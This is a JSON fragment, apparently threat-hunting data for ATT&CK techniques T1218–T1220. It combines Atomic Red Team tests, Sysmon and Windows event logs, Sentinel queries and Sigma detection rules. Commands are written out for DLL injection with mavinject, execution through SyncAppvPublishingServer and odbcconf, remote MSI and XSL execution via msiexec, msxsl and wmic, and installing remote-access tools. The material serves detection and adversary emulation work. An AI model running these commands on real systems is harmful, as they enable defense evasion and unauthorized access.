{bb1f7c32-5fc3-5e99-0000-00201ae20600}\nLogonId: 0x6e21a\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\nParentProcessGuid: {bb1f7c32-08db-5e9b-0000-001049f63d01}\nParentProcessId: 1900\nParentImage: C: \\ Windows \\ System32 \\ cmd.exe\nParentCommandLine: \"C: \\ Windows \\ system32 \\ cmd.exe\"", "name": "Log"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "It can be detected for the following command parameters.", "name": "It can be detected for the following command parameters."}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\n Msiexec.exe / q /i\"C:\\path\\to\\file.msi \"\n\n Msiexec.exe / q / i http [:] // site com / file.msi [.]\n\n Msiexec.exe / y \"C: \\ path \\ to \\ file.dll\"", "name": "Dos"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\nwindows security log\nEvent ID: 4688\nProcess information:\nNew Process ID: 0xfec\nNew Process Name: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe\n\nEvent ID: 4688\nProcess information:\nNew Process ID: 0x390\nNew Process Name: C: \\ Windows \\ SysWOW64 \\ rundll32.exe\n\nsysmon log\nEvent ID: 1\nImage: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: ODBC Driver Configuration Program\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: odbcconf.exe\nCommandLine: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe / a {regsvr C: \\ payload.dll}\nCurrentDirectory: C: \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\nLogonId: 0x6e21a\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1 = B1C49B2159C237B1F2BCE2D40508113E39143F7B\nParentProcessGuid: {bb1f7c32-f65d-5e9a-0000-0010833eef00}\nParentProcessId: 3868\nParentImage: C: \\ Windows \\ System32 \\ cmd.exe\nParentCommandLine: \"C: \\ Windows \\ system32 \\ cmd.exe\"\n\nEvent ID: 1\nImage: C: \\ Windows \\ SysWOW64 \\ rundll32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows host process (Rundll32)\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: RUNDLL32.EXE\nCommandLine: rundll32.exe\nCurrentDirectory: C: \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\nLogonId: 0x6e21a\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1 = 8939CF35447B22DD2C6E6F443446ACC1BF986D58\nParentProcessGuid: {bb1f7c32-f662-5e9a-0000-0010d648ef00}\nParentProcessId: 4076\nParentImage: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe\nParentCommandLine: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe / a {regsvr C: \\ payload.dll}", "name": "Log"}], "parsed_datasets": [{"Atomic Red Team Test - Signed Binary Proxy Execution": {"attack_technique": "T1218", "display_name": "Signed Binary Proxy Execution", "atomic_tests": [{"name": "mavinject - Inject DLL into running process", "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n", "supported_platforms": ["windows"], "input_arguments": {"dll_payload": {"description": "DLL to inject", "type": "Path", "default": "PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll"}, "process_id": {"description": "PID of process receiving injection", "type": "string", "default": 1000}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1218.dll must exist on disk at specified location (#{dll_payload})\n", "prereq_command": "if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll\" -OutFile \"#{dll_payload}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}\n"}}, {"name": "SyncAppvPublishingServer - Execute arbitrary PowerShell code", "description": "Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. Requires Windows 10.\n", "supported_platforms": ["windows"], "input_arguments": {"powershell_code": {"description": "PowerShell code to execute", "type": "string", "default": "Start-Process calc.exe"}}, "executor": {"name": "command_prompt", "command": "SyncAppvPublishingServer.exe \"n; #{powershell_code}\"\n"}}, {"name": "Register-CimProvider - Execute evil dll", "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n", "supported_platforms": ["windows"], "input_arguments": {"dll_payload": {"description": "DLL to execute", "type": "Path", "default": "PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n", "prereq_command": "if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n"}], "executor": {"name": "command_prompt", "command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}\n"}}, {"name": "Msiexec.exe - Execute Local MSI file", "description": "Execute arbitrary MSI file. Commonly seen in application installation. The MSI opens notepad.exe when sucessfully executed.\n", "supported_platforms": ["windows"], "input_arguments": {"msi_payload": {"description": "MSI file to execute", "type": "Path", "default": "PathToAtomicsFolder\\T1218\\src\\Win32\\T1218.msi"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1218.msi must exist on disk at specified location (#{msi_payload})\n", "prereq_command": "if (Test-Path #{msi_payload}) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host \"You must provide your own MSI\"\n"}], "executor": {"name": "command_prompt", "command": "msiexec.exe /q /i \"#{msi_payload}\"\n"}}, {"name": "Msiexec.exe - Execute Remote MSI file", "description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI opens notepad.exe when sucessfully executed.\n", "supported_platforms": ["windows"], "input_arguments": {"msi_payload": {"description": "MSI file to execute", "type": "String", "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218.msi"}}, "executor": {"name": "command_prompt", "command": "msiexec.exe /q /i \"#{msi_payload}\"\n"}}, {"name": "Msiexec.exe - Execute Arbitrary DLL", "description": "Execute arbitrary DLL file stored locally. Commonly seen in application installation.\nUpon execution, a window titled \"Boom!\" will open that says \"Locked and Loaded!\". For 32 bit systems change the dll_payload argument to the Win32 folder.\nBy default, if the src folder is not in place, it will download the 64 bit version.\n", "supported_platforms": ["windows"], "input_arguments": {"dll_payload": {"description": "DLL to execute", "type": "Path", "default": "PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1218.dll must exist on disk at specified location (#{dll_payload})\n", "prereq_command": "if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll\" -OutFile \"#{dll_payload}\"\n"}], "executor": {"name": "command_prompt", "command": "msiexec.exe /y \"#{dll_payload}\"\n"}}, {"name": "Odbcconf.exe - Execute Arbitrary DLL", "description": "Execute arbitrary DLL file stored locally.\n", "supported_platforms": ["windows"], "input_arguments": {"dll_payload": {"description": "DLL to execute", "type": "Path", "default": "PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n", "prereq_command": "if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n"}], "executor": {"name": "command_prompt", "command": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}\n"}}, {"name": "InfDefaultInstall.exe .inf Execution", "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n", "supported_platforms": ["windows"], "input_arguments": {"inf_to_execute": {"description": "Local location of inf file", "type": "string", "default": "PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "INF file must exist on disk at specified location (#{inf_to_execute})\n", "prereq_command": "if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf\" -OutFile \"#{inf_to_execute}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "InfDefaultInstall.exe #{inf_to_execute}\n"}}]}}, {"SysmonHunter - T1218": {"name": "Signed Binary Proxy Execution", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"any": {"pattern": "mavinject.exe|SyncAppvPublishingServer.exe"}}}]}}], "command_list": ["mavinject.exe #{process_id} /INJECTRUNNING PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll\n", null, "SyncAppvPublishingServer.exe \"n; Start-Process calc.exe\"\n", "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\n", "msiexec.exe /q /i \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218.msi\"\n", "msiexec.exe /q /i \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218.msi\"\n", "msiexec.exe /y \"PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll\"\n", "odbcconf.exe /S /A {REGSVR \"PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll\"}\n", "InfDefaultInstall.exe PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf\n", "mavinject.exe|SyncAppvPublishingServer.exe", "Log\n# Windows security log\nEvent ID: 4688\nProcess information:\nNew Process ID: 0xe78\nNew Process Name: C: \\ Windows \\ System32 \\ msiexec.exe\n\n# Sysmon log\nEvent ID: 1\nUtcTime: 2020-04-18 14: 04: 16.596\nProcessGuid: {bb1f7c32-08e0-5e9b-0000-0010b8ff3f01}\nProcessId: 3704\nImage: C: \\ Windows \\ System32 \\ msiexec.exe\nFileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows installer\nProduct: Windows Installer - Unicode\nCompany: Microsoft Corporation\nOriginalFileName: msiexec.exe\nCommandLine: msiexec / q / i http://192.168.126.146/1.msi\nCurrentDirectory: C: \\ Users \\ 12306Br0 \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\nLogonId: 0x6e21a\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\nParentProcessGuid: {bb1f7c32-08db-5e9b-0000-001049f63d01}\nParentProcessId: 1900\nParentImage: C: \\ Windows \\ System32 \\ cmd.exe\nParentCommandLine: \"C: \\ Windows \\ system32 \\ cmd.exe\"", "It can be detected for the following command parameters.", "Dos\n Msiexec.exe / q /i\"C:\\path\\to\\file.msi \"\n\n Msiexec.exe / q / i http [:] // site com / file.msi [.]\n\n Msiexec.exe / y \"C: \\ path \\ to \\ file.dll\"", "Log\nwindows security log\nEvent ID: 4688\nProcess information:\nNew Process ID: 0xfec\nNew Process Name: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe\n\nEvent ID: 4688\nProcess information:\nNew Process ID: 0x390\nNew Process Name: C: \\ Windows \\ SysWOW64 \\ rundll32.exe\n\nsysmon log\nEvent ID: 1\nImage: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: ODBC Driver Configuration Program\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: odbcconf.exe\nCommandLine: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe / a {regsvr C: \\ payload.dll}\nCurrentDirectory: C: \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\nLogonId: 0x6e21a\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1 = B1C49B2159C237B1F2BCE2D40508113E39143F7B\nParentProcessGuid: {bb1f7c32-f65d-5e9a-0000-0010833eef00}\nParentProcessId: 3868\nParentImage: C: \\ Windows \\ System32 \\ cmd.exe\nParentCommandLine: \"C: \\ Windows \\ system32 \\ cmd.exe\"\n\nEvent ID: 1\nImage: C: \\ Windows \\ SysWOW64 \\ rundll32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows host process (Rundll32)\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: RUNDLL32.EXE\nCommandLine: rundll32.exe\nCurrentDirectory: C: \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\nLogonId: 0x6e21a\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1 = 8939CF35447B22DD2C6E6F443446ACC1BF986D58\nParentProcessGuid: {bb1f7c32-f662-5e9a-0000-0010d648ef00}\nParentProcessId: 4076\nParentImage: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe\nParentCommandLine: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe / a {regsvr C: \\ payload.dll}"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 3and (process_path contains \"certutil.exe\"or process_command_line contains \"*certutil*script\\\\:http\\\\[\\\\:\\\\]\\\\/\\\\/*\"or process_path contains \"*\\\\replace.exe\")", "name": "Signed Binary Proxy Execution Network"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_command_line contains \"mavinject*\\\\/injectrunning\"or process_command_line contains \"mavinject32*\\\\/injectrunning*\"or process_command_line contains \"*certutil*script\\\\:http\\\\[\\\\:\\\\]\\\\/\\\\/*\"or process_command_line contains \"*certutil*script\\\\:https\\\\[\\\\:\\\\]\\\\/\\\\/*\"or process_command_line contains \"*msiexec*http\\\\[\\\\:\\\\]\\\\/\\\\/*\"or process_command_line contains \"*msiexec*https\\\\[\\\\:\\\\]\\\\/\\\\/*\")", "name": "Signed Binary Proxy Execution Process"}], "possible_detections": [{"data_source": {"title": "MavInject Process Injection", "id": "17eb8e57-9983-420d-ad8a-2c4976c22eb8", "status": "experimental", "description": "Detects process injection using the signed Windows tool Mavinject32.exe", "references": ["https://twitter.com/gN3mes1s/status/941315826107510784", "https://reaqta.com/2017/12/mavinject-microsoft-injector/", "https://twitter.com/Hexacorn/status/776122138063409152"], "author": "Florian Roth", "date": "2018/12/12", "tags": ["attack.t1055", "attack.t1218"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": "* /INJECTRUNNING *"}, "condition": "selection"}, "falsepositives": ["unknown"], "level": "critical"}}, {"data_source": {"title": "Application whitelisting bypass via bginfo", "id": "aaf46cdc-934e-4284-b329-34aa701e3771", "status": "experimental", "description": "Execute VBscript code that is referenced within the *.bgi file.", "references": ["https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml", "https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/"], "author": "Beyu Denis, oscd.community", "date": "2019/10/26", "modified": "2019/11/04", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1218"], "level": "medium", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image|endswith": "\\bginfo.exe", "CommandLine|contains|all": ["/popup", "/nolicprompt"]}, "condition": "selection"}, "falsepositives": ["Unknown"]}}, {"data_source": {"title": "Possible Application Whitelisting Bypass via WinDbg/CDB as a shellcode runner", "id": "b5c7395f-e501-4a08-94d4-57fe7a9da9d2", "status": "experimental", "description": "Launch 64-bit shellcode from the x64_calc.wds file using cdb.exe.", "references": ["https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Cdb.yml", "http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html"], "author": "Beyu Denis, oscd.community", "date": "2019/10/26", "modified": "2019/11/04", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1218"], "level": "medium", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image|endswith": "\\cdb.exe", "CommandLine|contains": "-cf"}, "condition": "selection"}, "falsepositives": ["Legitimate use of debugging tools"]}}, {"data_source": {"title": "Devtoolslauncher.exe executes specified binary", "id": "cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6", "status": "experimental", "description": "The Devtoolslauncher.exe executes other binary", "references": ["https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Devtoolslauncher.yml", "https://twitter.com/_felamos/status/1179811992841797632"], "author": "Beyu Denis, oscd.community (rule), @_felamos (idea)", "date": "2019/10/12", "modified": "2019/11/04", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1218"], "level": "critical", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image|endswith": "\\devtoolslauncher.exe", "CommandLine|contains": "LaunchForDeploy"}, "condition": "selection"}, "falsepositives": ["Legitimate use of devtoolslauncher.exe by legitimate user"]}}, {"data_source": {"title": "Application Whitelisting bypass via dnx.exe", "id": "81ebd28b-9607-4478-bf06-974ed9d53ed7", "status": "experimental", "description": "Execute C# code located in the consoleapp folder", "references": ["https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Csi.yml", "https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/"], "author": "Beyu Denis, oscd.community", "date": "2019/10/26", "modified": "2019/11/04", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1218"], "level": "medium", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image|endswith": "\\dnx.exe"}, "condition": "selection"}, "falsepositives": ["Legitimate use of dnx.exe by legitimate user"]}}, {"data_source": {"title": "Application Whitelisting bypass via dxcap.exe", "id": "60f16a96-db70-42eb-8f76-16763e333590", "status": "experimental", "description": "Detects execution of of Dxcap.exe", "references": ["https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dxcap.yml", "https://twitter.com/harr0ey/status/992008180904419328"], "author": "Beyu Denis, oscd.community", "date": "2019/10/26", "modified": "2019/11/04", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1218"], "level": "medium", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image|endswith": "\\dxcap.exe", "CommandLine|contains|all": ["-c", ".exe"]}, "condition": "selection"}, "falsepositives": ["Legitimate execution of dxcap.exe by legitimate user"]}}, {"data_source": {"title": "Possible Application Whitelisting Bypass via dll loaded by odbcconf.exe", "id": "65d2be45-8600-4042-b4c0-577a1ff8a60e", "description": "Detects defence evasion attempt via odbcconf.exe execution to load DLL", "status": "experimental", "references": ["https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml", "https://twitter.com/Hexacorn/status/1187143326673330176"], "author": "Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community", "date": "2019/10/25", "modified": "2019/11/07", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1218"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection_1": {"Image|endswith": "\\odbcconf.exe", "CommandLine|contains": ["-f", "regsvr"]}, "selection_2": {"ParentImage|endswith": "\\odbcconf.exe", "Image|endswith": "\\rundll32.exe"}, "condition": "selection_1 or selection_2"}, "level": "medium", "falsepositives": ["Legitimate use of odbcconf.exe by legitimate user"]}}, {"data_source": {"title": "OpenWith.exe executes specified binary", "id": "cec8e918-30f7-4e2d-9bfa-a59cc97ae60f", "status": "experimental", "description": "The OpenWith.exe executes other binary", "references": ["https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Openwith.yml", "https://twitter.com/harr0ey/status/991670870384021504"], "author": "Beyu Denis, oscd.community (rule), @harr0ey (idea)", "date": "2019/10/12", "modified": "2019/11/04", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1218"], "level": "high", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image|endswith": "\\OpenWith.exe", "CommandLine|contains": "/c"}, "condition": "selection"}, "falsepositives": ["Legitimate use of OpenWith.exe by legitimate user"]}}, {"data_source": {"title": "psr.exe capture screenshots", "id": "2158f96f-43c2-43cb-952a-ab4580f32382", "status": "experimental", "description": "The psr.exe captures desktop screenshots and saves them on the local machine", "references": ["https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Psr.yml", "https://www.sans.org/summit-archives/file/summit-archive-1493861893.pdf"], "author": "Beyu Denis, oscd.community", "date": "2019/10/12", "modified": "2019/11/04", "tags": ["attack.persistence", "attack.t1218"], "level": "medium", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image|endswith": "\\Psr.exe", "CommandLine|contains": "/start"}, "condition": "selection"}, "falsepositives": ["Unknown"]}}]}, {"technique_id": "T1219", "commands": [{"source": "atomics/T1219/T1219.yaml", "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe\nC:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe\n", "name": null}, {"source": "atomics/T1219/T1219.yaml", "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe\nC:\\Users\\$env:username\\Desktop\\AnyDesk.exe\n", "name": null}, {"source": "atomics/T1219/T1219.yaml", "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\nC:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/vnc", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/vnc", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/osx/screen_sharing", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/osx/screen_sharing", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Remote Access Tools": {"attack_technique": "T1219", "display_name": "Remote Access Tools", "atomic_tests": [{"name": "TeamViewer Files Detected Test on Windows", "description": "An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe\nC:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe\n"}}, {"name": "AnyDesk Files Detected Test on Windows", "description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe\nC:\\Users\\$env:username\\Desktop\\AnyDesk.exe\n"}}, {"name": "LogMeIn Files Detected Test on Windows", "description": "An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\nC:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/vnc", "ATT&CK Technique #1": "T1219", "ATT&CK Technique #2": "", "Technique": "Remote Access Tools", "Concatenate for Python Dictionary": "\"powershell/management/vnc\":  [\"T1219\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/management/osx/screen_sharing", "ATT&CK Technique #1": "T1219", "ATT&CK Technique #2": "T1021", "Technique": "Remote Access Tools", "Concatenate for Python Dictionary": "\"python/management/osx/screen_sharing\":  [\"T1219\",\"T1021\"],"}}], "command_list": ["Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe\nC:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe\n", "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe\nC:\\Users\\$env:username\\Desktop\\AnyDesk.exe\n", "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\nC:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi\n", "powershell/management/vnc", "powershell/management/vnc", "python/management/osx/screen_sharing", "python/management/osx/screen_sharing"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Antivirus Exploitation Framework Detection", "id": "238527ad-3c2c-4e4f-a1f6-92fd63adb864", "description": "Detects a highly relevant Antivirus alert that reports an exploitation framework", "date": "2018/09/09", "modified": "2019/01/16", "author": "Florian Roth", "references": ["https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/"], "tags": ["attack.execution", "attack.t1203", "attack.command_and_control", "attack.t1219"], "logsource": {"product": "antivirus"}, "detection": {"selection": {"Signature": ["*MeteTool*", "*MPreter*", "*Meterpreter*", "*Metasploit*", "*PowerSploit*", "*CobaltSrike*", "*Swrort*", "*Rozena*", "*Backdoor.Cobalt*"]}, "condition": "selection"}, "fields": ["FileName", "User"], "falsepositives": ["Unlikely"], "level": "critical"}}, {"data_source": {"title": "Suspicious TSCON Start", "id": "9847f263-4a81-424f-970c-875dab15b79b", "status": "experimental", "description": "Detects a tscon.exe start as LOCAL SYSTEM", "references": ["http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html", "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6"], "author": "Florian Roth", "date": "2018/03/17", "tags": ["attack.command_and_control", "attack.t1219"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"User": "NT AUTHORITY\\SYSTEM", "Image": "*\\tscon.exe"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}]}, {"technique_id": "T1220", "commands": [{"source": "atomics/T1220/T1220.yaml", "command": "C:\\Windows\\Temp\\msxsl.exe PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml #{xslfile}\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "C:\\Windows\\Temp\\msxsl.exe #{xmlfile} PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "C:\\Windows\\Temp\\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml #{xslfile}\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "C:\\Windows\\Temp\\msxsl.exe #{xmlfile} https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "wmic process list /FORMAT:\"#{local_xsl_file}\"\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "wmic #{wmic_command} /FORMAT:\"PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl\"\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "wmic process list /FORMAT:\"#{remote_xsl_file}\"\n", "name": null}, {"source": "atomics/T1220/T1220.yaml", "command": "wmic #{wmic_command} /FORMAT:\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\"\n", "name": null}, {"source": "SysmonHunter - XSL Script Processing", "command": "msxsl.exe", "name": null}, {"source": "SysmonHunter - XSL Script Processing", "command": "wmic.exeprocess|list|/FORMAT|.xsl", "name": null}, {"source": "SysmonHunter - XSL Script Processing", "command": "wmic.exeos|get|/FORMAT|.xsl", "name": null}], 